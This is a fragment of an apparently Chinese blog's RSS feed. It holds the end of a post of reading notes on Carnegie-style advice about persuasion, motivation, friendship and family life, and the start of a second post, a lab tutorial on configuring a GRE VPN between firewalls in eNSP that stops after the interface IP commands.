&lt;h2 id=&#34;4-如何改变他人的观点&#34;&gt;&lt;a href=&#34;#4-如何改变他人的观点&#34; class=&#34;headerlink&#34; title=&#34;4.如何改变他人的观点&#34;&gt;&lt;/a&gt;4.如何改变他人的观点&lt;/h2&gt;&lt;h3 id=&#34;强调彼此的共同点&#34;&gt;&lt;a href=&#34;#强调彼此的共同点&#34; class=&#34;headerlink&#34; title=&#34;强调彼此的共同点&#34;&gt;&lt;/a&gt;强调彼此的共同点&lt;/h3&gt;&lt;p&gt;如果你一开始就赞同对方的观点，便会营造一种和谐的谈话气氛，有利于实现你的目标。这时候，对方也容易放弃自己的偏见，转而赞同你的意见。&lt;/p&gt;
&lt;p&gt;如果想要让对方赞同你的观点，你需要做的是抓住谈话的共同点，然后强调这个共同点&lt;/p&gt;
&lt;p&gt;让一个人想要做某件事的方法是，让他认为你的说法是正确的，他是在做正确的事情。&lt;/p&gt;
&lt;p&gt;当你在说服别人时，如果能让对方在一开始就回答“是”，那么，你就成功了一半；如果能够引导看对方一直回答“是”，那么，你就成功了90%&lt;/p&gt;
&lt;p&gt;如果在谈话中，对方一开始就说“不”，即使你说得再多，依然很难改变他的观点。这时候，你需要做的是改变话题，或者改变谈话方式。先讨论双方都赞同的话题，然后逐渐进入有分的部分，在分岐中寻找双方都能接受的部分，慢慢减少彼此之间的分，最后说服对方。&lt;/p&gt;
&lt;p&gt;说服对方的过程中注意以下两点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#第一，提问的方式
哪种提问方式更容易得到肯定的回答呢？最好是带有暗示性的方式。例如，当推销员向顾客推销某个商品时，如果问顾客“喜不喜欢”或者“想不想要”，便很可能得到否定的回答。如果推销员说：“你一定很喜欢这个东西，是吗？这样获得肯定回答的几率就会高很多。
#第二，提问的内容
除了提问的方式之外，提问的内容也是非常重要的。例如，推销员询问顾客“今天的天气很好，是吗？”“最近的通货膨胀很严重，治安很混乱，是吗？等问题，虽然都能得到肯定的回答，但无法创造出和谐的谈话气氛，甚至会让顾客觉得庆烦。这样一来，肯定无法实现自己的目的了。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当我们在说服对方时，一定要想办法让对方回答“是”，引领着他一步步靠近我们的观点因此&lt;/p&gt;
&lt;p&gt;强调彼此的共同点，寻找让对方回答“是”的问题。&lt;/p&gt;
&lt;h3 id=&#34;给予他人说话的机会&#34;&gt;&lt;a href=&#34;#给予他人说话的机会&#34; class=&#34;headerlink&#34; title=&#34;给予他人说话的机会&#34;&gt;&lt;/a&gt;给予他人说话的机会&lt;/h3&gt;&lt;p&gt;如果想要说服他人，便努力为对方创造说话的机会&lt;/p&gt;
&lt;p&gt;即使是最顽固的人，当你耐心地倾听他说话时，他的态度也会逐渐地软化下来&lt;/p&gt;
&lt;p&gt;为了让他人赞同自己的观点，许多人都容易犯相同的错误：说话太多。&lt;/p&gt;
&lt;h3 id=&#34;先称赞，后责备&#34;&gt;&lt;a href=&#34;#先称赞，后责备&#34; class=&#34;headerlink&#34; title=&#34;先称赞，后责备&#34;&gt;&lt;/a&gt;先称赞，后责备&lt;/h3&gt;&lt;p&gt;当我们听完别人的称赞之后，再去听别人的批评，心里也会好受一些。&lt;/p&gt;
&lt;p&gt;如果用争论的方法不能说服对方，你可以尝试一下称赞的方法，或许会让对方放弃自己的观点，转而接受你的观点。&lt;/p&gt;
&lt;h3 id=&#34;鼓励更容易让人改正错误&#34;&gt;&lt;a href=&#34;#鼓励更容易让人改正错误&#34; class=&#34;headerlink&#34; title=&#34;鼓励更容易让人改正错误&#34;&gt;&lt;/a&gt;鼓励更容易让人改正错误&lt;/h3&gt;&lt;p&gt;当你告诉孩子、丈夫或者员工，他在某件事情上毫无天分，无论付出多少努力都无法成功时，你就打破了他的上进心如果你鼓励他、支持他，他就会有信心完成你的要求&lt;/p&gt;
&lt;p&gt;任何人都会犯错误，但每个人都喜欢被表扬，而不喜欢被批评。只要被批评就会产生消极情绪，而获得表扬就会信心十足。因此，在指出&lt;br&gt; 别人的错误时需要一定的技巧。&lt;/p&gt;
&lt;p&gt;一般来说，我们 要尽量委婉地指出别人的错误，避免直接的批评和攻击，否则不仅无法使对方意识到所犯的错误，还会使他产生逆反心理，难以接受你的批评。最好是用鼓励和赞赏的方法指出别人的错&lt;br&gt;误，让对方容易接受，而且不会产生逆反心理。&lt;/p&gt;
&lt;h3 id=&#34;委婉的指出他人的错误&#34;&gt;&lt;a href=&#34;#委婉的指出他人的错误&#34; class=&#34;headerlink&#34; title=&#34;委婉的指出他人的错误&#34;&gt;&lt;/a&gt;委婉的指出他人的错误&lt;/h3&gt;&lt;p&gt;任何人在面对直接的批评时，都会产生强烈的反感；如果能够巧妙地让他人意识到自己的错误，并给出建议的话对方就会很乐意接受&lt;/p&gt;
&lt;p&gt;当你希望别人满足你的期望时，在赞扬他之后，千万不要说“但是”，而是要说“而且”，这两个词能够产生截然不同的效果。&lt;/p&gt;
&lt;h3 id=&#34;先责己，后责人&#34;&gt;&lt;a href=&#34;#先责己，后责人&#34; class=&#34;headerlink&#34; title=&#34;先责己，后责人&#34;&gt;&lt;/a&gt;先责己，后责人&lt;/h3&gt;&lt;p&gt;即使一个人还没有改正自己的错误，但只要能够认识到自己的错误，便有助于帮助他改善自己的行为。&lt;/p&gt;
&lt;p&gt;如果批评者首先承认自己的错误，然后再指责他人的错误，那么，情况就会好很多。&lt;/p&gt;
&lt;h2 id=&#34;5-如何激励他人的行为&#34;&gt;&lt;a href=&#34;#5-如何激励他人的行为&#34; class=&#34;headerlink&#34; title=&#34;5.如何激励他人的行为&#34;&gt;&lt;/a&gt;5.如何激励他人的行为&lt;/h2&gt;&lt;h3 id=&#34;激发他人高尚的动机&#34;&gt;&lt;a href=&#34;#激发他人高尚的动机&#34; class=&#34;headerlink&#34; title=&#34;激发他人高尚的动机&#34;&gt;&lt;/a&gt;激发他人高尚的动机&lt;/h3&gt;&lt;p&gt;所有人都是理想主义者，都希望自己所做的事情有一个动听的理由。因此，如果你能激发出他人的高尚动机，便很容易实现自己的目标。&lt;/p&gt;
&lt;p&gt;即使是那些有意欺骗你的人，如果你能让他相信他是一个诚实、善良、正直的人，在大多数情况下，他都会朝着这个目标努力，达成你的期望&lt;/p&gt;
&lt;h3 id=&#34;激发他人竞争的欲望&#34;&gt;&lt;a href=&#34;#激发他人竞争的欲望&#34; class=&#34;headerlink&#34; title=&#34;激发他人竞争的欲望&#34;&gt;&lt;/a&gt;激发他人竞争的欲望&lt;/h3&gt;&lt;p&gt;竞争意识存在于强烈的自重感中，这是一个人不甘落后于人的最佳体现。&lt;/p&gt;
&lt;p&gt;每一个成功的人士都喜欢竞争，因为这是他表现自己的机会，更是证明他的能力和价值的平台&lt;/p&gt;
&lt;p&gt;无论是在生物界，还是在人类社会中，都存在着竞争。只要目的和方式都正当的竞争，便有利于增强人们的能力，从而提高效率&lt;/p&gt;
&lt;h3 id=&#34;称赞他人的进步&#34;&gt;&lt;a href=&#34;#称赞他人的进步&#34; class=&#34;headerlink&#34; title=&#34;称赞他人的进步&#34;&gt;&lt;/a&gt;称赞他人的进步&lt;/h3&gt;&lt;p&gt;如果我们愿意激励所接触到的每一个人，帮助他挖掘出内在的潜力，那么，不仅能够使其进步，甚至会改变他的一生。&lt;/p&gt;
&lt;p&gt;称赞对方的进步，即使是微不足道的进步，对方也会铭记在心，并激励着自己走向成功&lt;/p&gt;
&lt;p&gt;所有人都渴望得到称赞和认同，而且会尽力得到它，但几乎没有人喜欢阿奉承&lt;/p&gt;
&lt;h3 id=&#34;让他人拥有一个好名声&#34;&gt;&lt;a href=&#34;#让他人拥有一个好名声&#34; class=&#34;headerlink&#34; title=&#34;让他人拥有一个好名声&#34;&gt;&lt;/a&gt;让他人拥有一个好名声&lt;/h3&gt;&lt;p&gt;如果你希望某个人拥有一种美德，你可以公开宣称他已经拥有这种美德了，尽管他确实没有。给他一个好名声，让他为此去奋斗，他就会竭尽全力去做，绝对不想令你失望&lt;/p&gt;
&lt;p&gt;对于普通人来说，如果他能够尊重你，而你也对他的某种能力表示肯定，那么，他就愿意服从你的命令。&lt;/p&gt;
&lt;p&gt;如果你希望一个人在某方面有所改变，必须承认他在这方面已经很优秀了。莎士比亚曾说：“如果你没有一种美德你必须认为自己已经有了。&lt;/p&gt;
&lt;p&gt;在心理学中的期待效应”，是指我们在人际交往中，如果想要让对方达到某个目标，必须对对方寄予某种期望，还要用语言将这种期望表示出来，让对方知道你的期望，这样能够让对方更容易达成目标。&lt;/p&gt;
&lt;p&gt;有句古语说：“如果人背了恶名，还不如一死了之。无论是穷人、富人，还是、强盗，所有人都希望自己有一个好名声&lt;/p&gt;
&lt;h3 id=&#34;善于向他人授权&#34;&gt;&lt;a href=&#34;#善于向他人授权&#34; class=&#34;headerlink&#34; title=&#34;善于向他人授权&#34;&gt;&lt;/a&gt;善于向他人授权&lt;/h3&gt;&lt;p&gt;如果你希望别人高高兴兴地去做你让他做的事情，那么，你就需要让他明白，他对你来说是很重要的。这样一来，他也会认为自己是无可替代的，从而满足你的要求。&lt;/p&gt;
&lt;p&gt;当你对他人有所求时，你可以采用委婉、欣赏的方式这样他更容易答应你的请求。&lt;/p&gt;
&lt;p&gt;人类的自重感是为了满足本性的需求，由内部自重和外部自重两部分组成。内部自重指的是每个人都希望拥有实力、充满自信、独立自主，也就是我们所谓的自尊；外部自重指的是人们对于社会地位、自身威望的渴求，希望能够得到他人的尊重和信任。&lt;/p&gt;
&lt;p&gt;从个人心理学角度来说，当一个人被授予某种头衔时，他对自己的认知就会发生变化。在潜意识中，他会将自己与头衔联系在一起，按照头衔的要求做事，否则他的认知就会失调，也就是认识与言行之间产生矛盾冲突，从而觉得很不适应。因此，为了避免这种情况，他一定会用实际行动维护这个头街带给自己的荣誉&lt;/p&gt;
&lt;h3 id=&#34;真诚地请求他人帮忙&#34;&gt;&lt;a href=&#34;#真诚地请求他人帮忙&#34; class=&#34;headerlink&#34; title=&#34;真诚地请求他人帮忙&#34;&gt;&lt;/a&gt;真诚地请求他人帮忙&lt;/h3&gt;&lt;p&gt;每一个人都希望被人欣赏、被人尊重，甚至会使用各种方法实现这个目标。&lt;/p&gt;
&lt;p&gt;请求别人为你做事，不仅能够让对方产生自重、高贵的感觉，还能激发出对方的创造力，让你拥有意想不到的收获。&lt;/p&gt;
&lt;p&gt;在这里，我需要强调一点，有些人会机械地运用这个规则。虽然我们需要激发出对方的自重感和高贵感，但不是通过馅媚或者虚伪的方式，如果出发点是错误的，绝对不会产生理想的效果。&lt;/p&gt;
&lt;p&gt;虽然每个人都希望得到他人的赞赏和尊重，但任何人都不会接受馅媚、虚伪的奉承。&lt;/p&gt;
&lt;h2 id=&#34;6-如何获得他人的好感&#34;&gt;&lt;a href=&#34;#6-如何获得他人的好感&#34; class=&#34;headerlink&#34; title=&#34;6.如何获得他人的好感&#34;&gt;&lt;/a&gt;6.如何获得他人的好感&lt;/h2&gt;&lt;h3 id=&#34;被容纳是每个人的渴望&#34;&gt;&lt;a href=&#34;#被容纳是每个人的渴望&#34; class=&#34;headerlink&#34; title=&#34;被容纳是每个人的渴望&#34;&gt;&lt;/a&gt;被容纳是每个人的渴望&lt;/h3&gt;&lt;p&gt;每个人都希望自己能够被他人接受，可以轻松地与他人相处，这是所有人内心的深切渴望&lt;/p&gt;
&lt;p&gt;问候不仅是一种礼貌，也是一种安感，而且能够缩短人们之间的距离，让人与人之间的关系更加紧密。因此，问候是表达友善的一种方式。&lt;/p&gt;
&lt;p&gt;给身边的人送去问候，不仅打开了自己尘封的心灵，也会给别人带来温暖。问候是一种礼貌，也是一种安感，能够缩短人们之间的距离，让人们更加亲密。因此，问候是表达友善的一种方式。&lt;/p&gt;
&lt;h3 id=&#34;学会尊重他人&#34;&gt;&lt;a href=&#34;#学会尊重他人&#34; class=&#34;headerlink&#34; title=&#34;学会尊重他人&#34;&gt;&lt;/a&gt;学会尊重他人&lt;/h3&gt;&lt;p&gt;每个人都会维护自己的尊严，给予他一种自重感，他就会忠诚于你，而不会背叛。&lt;/p&gt;
&lt;p&gt;无礼的命令只会招来他人的恨，即使这种命令能够改正他人的错误。&lt;/p&gt;
&lt;p&gt;任何人都有自尊心，所以你在维护自己的自尊心时，千万不能伤害到他人的自尊心。尊重是相互的，只有尊重别人，才能够得到别人的尊重。&lt;/p&gt;
&lt;p&gt;人类是一种奇怪的动物，而且有着强烈的自尊心，他们可以在暗地里吃亏，也可以在明面上吃亏，但就是不能在自尊心上吃亏&lt;/p&gt;
&lt;p&gt;如果想要对他人产生影响的话，一定要学会从对方的角度考虑问题，满足对方的自尊心。这样，对方才会去做你希望他做的事情，而且不会背你。&lt;/p&gt;
&lt;h3 id=&#34;请求别人批评自己&#34;&gt;&lt;a href=&#34;#请求别人批评自己&#34; class=&#34;headerlink&#34; title=&#34;请求别人批评自己&#34;&gt;&lt;/a&gt;请求别人批评自己&lt;/h3&gt;&lt;p&gt;每个人每天至少有五分钟是一个大笨蛋，所谓的智慧就是如何不超过这五分钟的限制&lt;/p&gt;
&lt;p&gt;那些反对你、指责你、阻碍你的人都是你的导师，你可以从他们那里学到更多的定西。&lt;/p&gt;
&lt;p&gt;既然每个人都会做错事和事，为什么要在意别人的批评呢&lt;br&gt;愚蠢的人受到批评时会反、发气，但聪明人会从批评者身上学到自己没有的东西。&lt;/p&gt;
&lt;p&gt;著名诗人惠特曼曾说：“难道你只会从慕你、恭维你的人身上学习知识吗？那些反对你、批评你、指责你的人不是能让你学到更多吗？”罗契方卡也说：“敌人的意见要比我们自己的意见更加接近事实。&lt;/p&gt;
&lt;h3 id=&#34;拥抱对手&#34;&gt;&lt;a href=&#34;#拥抱对手&#34; class=&#34;headerlink&#34; title=&#34;拥抱对手&#34;&gt;&lt;/a&gt;拥抱对手&lt;/h3&gt;&lt;p&gt;如果我们的对手知道他们能够让我们伤心、烦恼的话他们一定会很开心，因为这种痛苦无法伤害他们，但会伤害我们自己。&lt;/p&gt;
&lt;p&gt;我们要学着关爱自己的对手，这样不仅能够化干戈为玉，赢得对手的好感，还会给自己带来快乐&lt;/p&gt;
&lt;p&gt;莎士比亚曾说：“不要让你的对手在你心中点燃一把火，则烧伤得只能是你自己。“&lt;/p&gt;
&lt;h3 id=&#34;人的本性是容易忘记感恩&#34;&gt;&lt;a href=&#34;#人的本性是容易忘记感恩&#34; class=&#34;headerlink&#34; title=&#34;人的本性是容易忘记感恩&#34;&gt;&lt;/a&gt;人的本性是容易忘记感恩&lt;/h3&gt;&lt;p&gt;忘记感谢是人的本性，假如我们一直期望别人感恩的话，大多数都是自寻烦恼。&lt;/p&gt;
&lt;p&gt;想要获得真正的快乐， 就必须抛弃别人会不会感激你的念头，只享受付出的快乐。&lt;/p&gt;
&lt;p&gt;我们不要试着指望别人报答，当偶尔得到了别人的感激的时候，就会是一种惊喜，而得不到也不会为此难过。&lt;/p&gt;
&lt;h2 id=&#34;7-如何让你变得更加成熟&#34;&gt;&lt;a href=&#34;#7-如何让你变得更加成熟&#34; class=&#34;headerlink&#34; title=&#34;7.如何让你变得更加成熟&#34;&gt;&lt;/a&gt;7.如何让你变得更加成熟&lt;/h2&gt;&lt;h3 id=&#34;勇于承担责任&#34;&gt;&lt;a href=&#34;#勇于承担责任&#34; class=&#34;headerlink&#34; title=&#34;勇于承担责任&#34;&gt;&lt;/a&gt;勇于承担责任&lt;/h3&gt;&lt;p&gt;让自己变得成熟的第一步就是勇于承担责任。我们都早已摆脱了自己跌倒将责任推给桌椅的孩童时代，我们应该勇敢地面对人生，学会对自己负责。&lt;/p&gt;
&lt;p&gt;一个希望自己变得成熟的人一定要记得，对自己的所作所为负责，勇于承担责任，而不是寻找借口&lt;/p&gt;
&lt;h3 id=&#34;拥有坚定的信念&#34;&gt;&lt;a href=&#34;#拥有坚定的信念&#34; class=&#34;headerlink&#34; title=&#34;拥有坚定的信念&#34;&gt;&lt;/a&gt;拥有坚定的信念&lt;/h3&gt;&lt;p&gt;除了勇于承担责任之外，我们还要拥有坚定的信念，否则所有的理论都将化为泡影&lt;/p&gt;
&lt;p&gt;我们的信念是否能够发挥作用，关键不在于如何去想而是如何去做。基督耶曾说：“观其果而知其因”，重要的是如何去做。&lt;/p&gt;
&lt;p&gt;如果我们不采取行动的话，再坚定的信念也会毫无作用，我们的生活会充满虚伪，变得不再真实。因此，如果我们拥有坚定的信念，便认真地做好每一件事。&lt;/p&gt;
&lt;h3 id=&#34;做独一无二的自己&#34;&gt;&lt;a href=&#34;#做独一无二的自己&#34; class=&#34;headerlink&#34; title=&#34;做独一无二的自己&#34;&gt;&lt;/a&gt;做独一无二的自己&lt;/h3&gt;&lt;p&gt;每个人都是独一无二的，虽然构成人体的基因相同，但每个人的生命都是独成一体，各不相同&lt;/p&gt;
&lt;p&gt;每天都要为自己创造一段独处的时光，抛弃所有的事物，拒接所有的电话，这是我们探索自己、了解自己必须要做的事情。&lt;/p&gt;
&lt;p&gt;只有了解了自己，才能更好地了解别人&lt;/p&gt;
&lt;p&gt;一 、在独处中认识自己&lt;br&gt;随着生活节奏的加快，我们能够沉思的时间越来越少了。在这种情况下，我们更应该给自己留出一些独处的时间，为自己创造反省的机会，以便进一步认识自己。当然，每个人都拥有自己的独处方式。&lt;/p&gt;
&lt;p&gt;二、摆脱习惯的柳锁&lt;br&gt;我们都将自己理在了习惯和无聊的事物中，只有通过最大的努力才能挣脱出来&lt;/p&gt;
&lt;p&gt;三、挖掘生活中令自己满意的东西&lt;br&gt;如果想要评价一个人的人格，最佳的时机是他处于最活跃、最满意的状态，这时他内心的想法是这才是真正的我。也就是说，当人们处于兴奋状态时，真正的自我就会浮现出来。&lt;/p&gt;
&lt;p&gt;虽然一个人的个性难以改变，但可以通过某些行为表现出与众不同的特征。如果想要展示出真正的自我，便需要除掉内心深处的恐惧、缩、猜疑、迷茫、恶习等，而兴奋就是除掉这些东西的良药。&lt;/p&gt;
&lt;h3 id=&#34;学会喜欢自己&#34;&gt;&lt;a href=&#34;#学会喜欢自己&#34; class=&#34;headerlink&#34; title=&#34;学会喜欢自己&#34;&gt;&lt;/a&gt;学会喜欢自己&lt;/h3&gt;&lt;p&gt;我们要喜欢、尊重、欣赏自己，这不仅可以培养出健康成熟的个性，还可以提高我们人际交往的能力&lt;/p&gt;
&lt;p&gt;如果想要获得进步、突出自我，就要及时纠正自己的错误，发挥自己的优点，展现出自己最优秀的一面。&lt;/p&gt;
&lt;p&gt;在日常生活中，如果我们自己都不喜欢自己，那么很难期待别人会喜欢与我们在一起。&lt;/p&gt;
&lt;h3 id=&#34;坚持自我本色&#34;&gt;&lt;a href=&#34;#坚持自我本色&#34; class=&#34;headerlink&#34; title=&#34;坚持自我本色&#34;&gt;&lt;/a&gt;坚持自我本色&lt;/h3&gt;&lt;p&gt;尽可能站在他人的角度看待问题，但是千万不要因此就失去自己的观点。&lt;/p&gt;
&lt;p&gt;每个人生命的真正意义，就是要把自身所具有的各种才能发挥出来&lt;/p&gt;
&lt;p&gt;假如一个人完全顺从和超利避害的话，这个人就会变成奴。只有那些勇于接受生活挑战，投入到生活中去努力奋斗的人，才能获得真正的自由&lt;/p&gt;
&lt;h3 id=&#34;争取并珍爱友谊&#34;&gt;&lt;a href=&#34;#争取并珍爱友谊&#34; class=&#34;headerlink&#34; title=&#34;争取并珍爱友谊&#34;&gt;&lt;/a&gt;争取并珍爱友谊&lt;/h3&gt;&lt;p&gt;获得友谊的最好办法，就是注重给予，而不是收获&lt;/p&gt;
&lt;p&gt;究竟用什么方法能够赢得别人的喜欢呢？答案其实很简单，那就是待人诚恳、热爱生活。&lt;/p&gt;
&lt;p&gt;与人相处时，不要担心别人是否喜欢我们，而是要用心待人，培养能让别人喜欢你的品质&lt;/p&gt;
&lt;p&gt;在这个世界上，每个人都有自己独立的人格，没有人会毫无缘由的喜欢你。你有什么特殊的理由让别人喜欢你，并与你成为朋友呢？&lt;/p&gt;
&lt;p&gt; 无论是在生活中，还是在工作中，我们都必须端正自己的心态，不断地提升自已的人格魅力，这样才能使自己具备招人喜欢的特质和品行，才能赢得他人的关注和青睐。&lt;/p&gt;
&lt;p&gt;中国的思想家孔子，曾经这样说过：“不惠人之不已知，惠不能也。意思是说，在生活中最重要的，并不是别人有没有爱我们，而是我们值不值得被别人爱。&lt;/p&gt;
&lt;p&gt;假如你想要赢得别人的友谊或感情的话，没必要先担心别人是不是喜欢我们，而是应该不断提升自己值得别人喜欢的品质。&lt;/p&gt;
&lt;h2 id=&#34;8-如何让你的家庭变得幸福&#34;&gt;&lt;a href=&#34;#8-如何让你的家庭变得幸福&#34; class=&#34;headerlink&#34; title=&#34;8.如何让你的家庭变得幸福&#34;&gt;&lt;/a&gt;8.如何让你的家庭变得幸福&lt;/h2&gt;&lt;h3 id=&#34;不要自掘婚姻的坟墓&#34;&gt;&lt;a href=&#34;#不要自掘婚姻的坟墓&#34; class=&#34;headerlink&#34; title=&#34;不要自掘婚姻的坟墓&#34;&gt;&lt;/a&gt;不要自掘婚姻的坟墓&lt;/h3&gt;&lt;p&gt;地狱中的魔鬼，发明了很多种毁灭爱情的烈火，其中喋喋不休是最致命的，它带给婚姻的永远只有悲剧&lt;/p&gt;
&lt;p&gt;即便贵为一国之母，拥有全世界最美丽的面孔，也不要对自己的喋喋不休，这种只会给婚姻挖掘坟墓。&lt;/p&gt;
&lt;h3 id=&#34;不要用爱的名义改变对方&#34;&gt;&lt;a href=&#34;#不要用爱的名义改变对方&#34; class=&#34;headerlink&#34; title=&#34;不要用爱的名义改变对方&#34;&gt;&lt;/a&gt;不要用爱的名义改变对方&lt;/h3&gt;&lt;p&gt;一段成功的婚姻，不仅取决于你寻找的那个配偶，还取决于在这段婚姻中，你自已该如何做一个好的配偶。&lt;/p&gt;
&lt;p&gt;假如你想拥有快乐的家庭生活，请记住，千万不要试图用爱的名义改造你的伴侣。&lt;/p&gt;
&lt;h3 id=&#34;不要批评家人&#34;&gt;&lt;a href=&#34;#不要批评家人&#34; class=&#34;headerlink&#34; title=&#34;不要批评家人&#34;&gt;&lt;/a&gt;不要批评家人&lt;/h3&gt;&lt;p&gt;50%以上婚姻失败的原因，就是那些无用的、令人心碎的批评。&lt;/p&gt;
&lt;p&gt;不要对家人要求太刻，每当你想批评他们的时候，假装温柔一点，你会得到意想不到的效果&lt;/p&gt;
&lt;h3 id=&#34;真诚地欣赏对方&#34;&gt;&lt;a href=&#34;#真诚地欣赏对方&#34; class=&#34;headerlink&#34; title=&#34;真诚地欣赏对方&#34;&gt;&lt;/a&gt;真诚地欣赏对方&lt;/h3&gt;&lt;p&gt;在这个世界上，无论是男人还是女人，都渴望得到别人的赞赏和热爱。假如对方能够衷心地表示赞赏和热爱的话，他就会得到幸福和快乐&lt;/p&gt;
&lt;p&gt;请男人们记住，男人真诚的赞美会使女人获得安全感得到心理的满足，所以她们对干那些称赞过自己的男士的印象最为深刻&lt;/p&gt;
&lt;p&gt;请所有的女士记住，你的丈夫无论长得美丑、事业是否成功，他都希望自己在你眼里是最棒的，你的赞美就是赢得他内心的关键。&lt;/p&gt;
&lt;h3 id=&#34;细微之处见真情&#34;&gt;&lt;a href=&#34;#细微之处见真情&#34; class=&#34;headerlink&#34; title=&#34;细微之处见真情&#34;&gt;&lt;/a&gt;细微之处见真情&lt;/h3&gt;&lt;p&gt;很多男人总是不注意日常生活中的一些小事，因为他们不知道这些小事能够体现出他们对女人的体贴，而往往爱的远进，都是从一些细微的地方开始的。&lt;/p&gt;
&lt;p&gt;为什么一定要等到你的妻子生病住院了，你才给她买花呢？为什么不在明天晚上就买一束玫瑰花送给她呢？如果你愿意的话，不立即去做，看看结果会如何&lt;/p&gt;
&lt;p&gt;婚姻是由一连串的项事组成的，如果忽略了这个事实的话，就将会造成家庭生活的灾难。&lt;/p&gt;
&lt;h3 id=&#34;家庭内部也应有礼&#34;&gt;&lt;a href=&#34;#家庭内部也应有礼&#34; class=&#34;headerlink&#34; title=&#34;家庭内部也应有礼&#34;&gt;&lt;/a&gt;家庭内部也应有礼&lt;/h3&gt;&lt;p&gt;礼貌是一种品质，它可以弥补服饰和外在的缺陷。&lt;/p&gt;
&lt;p&gt;在个人的幸福快乐方面，婚姻要比世界更加重要，更加切身。&lt;/p&gt;
&lt;p&gt;不讲道理就像是吞爱情的癌细胞。我们每个人都知道这一点，但并不是每个人都能做到。大多情况下我们对待自的家人， 却不及对待陌生人那样有礼貌&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/</guid>
            <title>GRE VPN配置</title>
            <link>https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Mon, 27 May 2024 18:23:30 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;GRE-VPN配置&#34;&gt;&lt;a href=&#34;#GRE-VPN配置&#34; class=&#34;headerlink&#34; title=&#34;GRE VPN配置&#34;&gt;&lt;/a&gt;GRE VPN配置&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图：&#34;&gt;&lt;a href=&#34;#实验拓扑图：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图：&#34;&gt;&lt;/a&gt;实验拓扑图：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527183724828.png&#34; alt=&#34;image-20240527183724828&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先配置pc的ip子网掩码和网关&lt;/p&gt;
&lt;p&gt;2.然后开始对防火墙进行配置，配端口ip&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]ip address 192.168.0.254 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]ip address 202.0.0.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/0]ip address 192.168.1.254 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/1]ip address 202.0.0.2 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;这里开始把tunnel隧道也配置好&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
